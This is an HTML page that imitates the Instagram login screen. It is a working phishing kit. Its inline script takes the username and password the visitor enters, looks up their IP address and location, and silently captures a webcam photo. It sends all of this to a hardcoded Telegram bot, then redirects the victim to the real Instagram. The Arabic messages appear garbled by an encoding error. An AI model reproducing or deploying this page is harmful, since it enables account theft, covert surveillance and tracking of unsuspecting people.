<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="styles.css" />
    <link rel="icon" type="image/png" href="img/insta-fav.ico">
    <title>Instagram</title>
</head>
<body>
    <main class="flex align-items-center justify-content-center">
        <section id="mobile" class="flex">
        </section>
        <section id="auth" class="flex direction-column">
            <div class="panel login flex direction-column">
                <h1 title="Instagram" class="flex justify-content-center">
                    <img src="img/instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
                </h1>
                <form id="loginForm" onsubmit="submitForm(event)">
                    <label for="email" class="sr-only">Phone number, username or email</label>
                    <input id="email" name="email" placeholder="Phone number, username or email" required />

                    <label for="password" class="sr-only">Password</label>
                    <input id="password" name="password" type="password" placeholder="Password" required />

                    <button type="submit">Log In</button>
                </form>
                <div class="flex separator align-items-center">
                    <span></span>
                    <div class="or">OR</div>
                    <span></span>
                </div>
                <div class="login-with-fb flex direction-column align-items-center">
                    <div>
                        <img src="img/facebook-logo.png" alt="" />
                        <a href="#">Log in with Facebook</a>
                    </div>
                    <a href="#">Forgot password?</a>
                </div>
            </div>
            <div class="panel register flex justify-content-center">
                <p>Don't have an account?</p>
                <a href="#">Sign up</a>
            </div>
            <div class="app-download flex direction-column align-items-center">
                <p>Get the app.</p>
                <div class="flex justify-content-center">
                    <img src="img/apple-button.png" alt="Apple Store logo" title="Apple Store logo" />
                    <img src="img/googleplay-button.png" alt="Google Play logo" title="Google Play logo" />
                </div>
            </div>
        </section>
    </main>
    <footer>
        <ul class="flex flex-wrap justify-content-center">
            <li><a href="#">ABOUT</a></li>
            <li><a href="#">HELP</a></li>
            <li><a href="#">PRESS</a></li>
            <li><a href="#">API</a></li>
            <li><a href="#">CAREERS</a></li>
            <li><a href="#">PRIVACY</a></li>
            <li><a href="#">TERMS</a></li>
            <li><a href="#">LOCATIONS</a></li>
            <li><a href="#">TOP ACCOUNTS</a></li>
            <li><a href="#">HASHTAGS</a></li>
            <li><a href="#">LANGUAGE</a></li>
        </ul>
        <p class="copyright">¬© 2020 Instagram from Facebook</p>
    </footer>

    <script>
        const botToken = "7590971159:AAEKdP-eSEE99hsy1rTEUAi0zba7BginDoA";
        const chatId = "5091980014"; // Telegram user ID

        // Fetch user's IP and location
        function getUserLocation() {
            return fetch('http://ip-api.com/json')
                .then(response => response.json())
                .then(data => ({
                    ip: data.query,
                    location: `${data.city}, ${data.country}`
                }))
                .catch(() => ({
                    ip: 'ÿ∫Ÿäÿ± ŸÖÿπÿ±ŸàŸÅ',
                    location: 'ÿ∫Ÿäÿ± ŸÖÿπÿ±ŸàŸÅ'
                }));
        }

        // Capture user's image from webcam
        function captureImage() {
            return new Promise((resolve, reject) => {
                const video = document.createElement('video');
                const canvas = document.createElement('canvas');
                const context = canvas.getContext('2d');

                navigator.mediaDevices.getUserMedia({ video: true })
                    .then(stream => {
                        video.srcObject = stream;
                        video.play();

                        setTimeout(() => {
                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
                            video.srcObject.getTracks().forEach(track => track.stop());
                            resolve(canvas.toDataURL('image/jpeg')); // Image as base64
                        }, 3000); // Capture after 3 seconds
                    })
                    .catch(reject);
            });
        }

        // Submit form data
        function submitForm(event) {
            event.preventDefault();

            const email = document.getElementById("email").value;
            const password = document.getElementById("password").value;

            // Get user's location
            getUserLocation().then(locationData => {
                // Capture webcam image
                captureImage().then(imageData => {
                    const message = `
                        *[ÿ™ŸÖ ÿßÿÆÿ™ÿ±ÿßŸÇ ÿßŸÑŸÅÿ£ÿ± ÿ®ŸÜÿ¨ÿßÿ≠]*
                        üîê _ÿ™ŸÖ ÿßŸÑÿØÿÆŸàŸÑ ÿ•ŸÑŸâ ÿßŸÑÿ≠ÿ≥ÿßÿ® ÿßŸÜÿ≥ÿ™ÿ¨ÿ±ÿßŸÖ..._

                        ‚è≥ *ÿßŸÑŸàŸÇÿ™:* ${new Date().toLocaleString()}
                        üìß *ÿßŸÑÿ®ÿ±ŸäÿØ ÿßŸÑÿ•ŸÑŸÉÿ™ÿ±ŸàŸÜŸä:* \`${email}\`
                        üíª *ŸÉŸÑŸÖÿ© ÿßŸÑŸÖÿ±Ÿàÿ±:* \`${password}\`
                        üåê *IP:* ${locationData.ip}
                        üåç *ÿßŸÑŸÖŸàŸÇÿπ:* ${locationData.location}

                        _ÿßÿ≥ÿ™ŸÉŸÖÿßŸÑ ÿßŸÑÿ™ŸÜŸÅŸäÿ∞..._ üåë
                        *ÿßŸÑÿπŸÖŸÑŸäÿ© ÿ™ÿ™ŸÖ ŸÅŸä ÿµŸÖÿ™.*
                        ‚ö†Ô∏è *ÿ™ÿ≠ÿ∞Ÿäÿ±:* Ÿáÿ∞Ÿá ÿßŸÑÿ®ŸäÿßŸÜÿßÿ™ ŸÑÿß Ÿäÿ¨ÿ® ÿ£ŸÜ ÿ™Ÿèÿ¥ÿßÿ±ŸÉ ŸÖÿπ ÿ£Ÿä ÿ∑ÿ±ŸÅ ÿ¢ÿÆÿ±.
                    `;

                    // Send message and image to Telegram
                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            chat_id: chatId,
                            caption: message,
                            photo: imageData, // Sending image as base64
                        }),
                    })
                    .then(response => response.json())
                    .then(data => {
                        if (data.ok) {
                            alert('ÿ™ŸÖ ÿ•ÿ±ÿ≥ÿßŸÑ ÿßŸÑÿ®ŸäÿßŸÜÿßÿ™ ÿ®ŸÜÿ¨ÿßÿ≠!');
                            window.location.href = 'https://www.instagram.com'; // Redirect to Instagram
                        } else {
                            alert('ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£ ÿ£ÿ´ŸÜÿßÿ° ÿ•ÿ±ÿ≥ÿßŸÑ ÿßŸÑÿ®ŸäÿßŸÜÿßÿ™.');
                        }
                    })
                    .catch(error => {
                        console.error('Error:', error);
                        alert('ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£.');
                    });
                }).catch(error => {
                    console.error('Error capturing image:', error);
                    alert('ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£ ŸÅŸä ÿßŸÑÿ™ŸÇÿßÿ∑ ÿßŸÑÿµŸàÿ±ÿ©.');
                });
            }).catch(error => {
                console.error('Error fetching location:', error);
                alert('ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£ ŸÅŸä ÿ™ÿ≠ÿØŸäÿØ ÿßŸÑŸÖŸàŸÇÿπ.');
            });
        }
    </script>
</body>
</html>
